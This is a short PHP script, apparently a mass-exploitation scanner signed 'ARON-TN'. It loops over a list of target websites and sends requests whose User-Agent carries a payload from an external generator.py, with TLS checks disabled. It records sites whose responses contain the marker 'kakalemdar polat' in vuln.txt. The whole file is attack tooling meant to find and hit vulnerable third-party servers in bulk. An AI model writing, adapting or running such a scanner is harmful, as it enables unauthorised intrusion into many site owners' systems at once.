<?php
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);
if(!isset($argv[1]))
{
   die("usage: $argv[0] list.txt");

}
$list=file($argv[1]);
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);
function send_request_cgi($url,$fields,$ua)
{
  $init=curl_init($url);
  curl_setopt($init,CURLOPT_RETURNTRANSFER,1);
  curl_setopt($init,CURLOPT_COOKIEJAR,"xv.txt");
  curl_setopt($init,CURLOPT_COOKIEFILE,"xv.txt");
  curl_setopt($init,CURLOPT_HEADER,1);
  curl_setopt($init, CURLOPT_SSL_VERIFYHOST, false);
  curl_setopt($init, CURLOPT_SSL_VERIFYPEER, false);
  curl_setopt($init,CURLOPT_FOLLOWLOCATION,1);
  curl_setopt($init,CURLOPT_TIMEOUT,3);
  curl_setopt($init,CURLOPT_CONNECTTIMEOUT,3);
  curl_setopt($init,CURLOPT_USERAGENT,$ua);
  $exe=curl_exec($init);
  if(preg_match("/kakalemdar polat/",$exe))
{
$fp4=fopen("vuln.txt","a+");
fwrite($fp4,$url."\n");
fclose($fp4);

}
  return $exe;
  
  }
  function get_payload($header)
{
  $ka=trim(shell_exec("generator.py"));
  return $ka;
}
for($i=0;$i<count($list);$i++)

{
$site[$i]=strtok($list[$i],"\n");
$sites=trim($site[$i]);
$res=send_request_cgi($sites,"",get_payload("RHION"));
$res2=send_request_cgi($sites,"",get_payload("RHION"));
$res=send_request_cgi($sites,"",get_payload("RHION"));
$res2=send_request_cgi($sites,"",get_payload("RHION"));
 
  }
  
   echo"\n\n< FINISHED - BY ARON-TN  >";$clientpass=trim(fgets(STDIN,1024));
?>
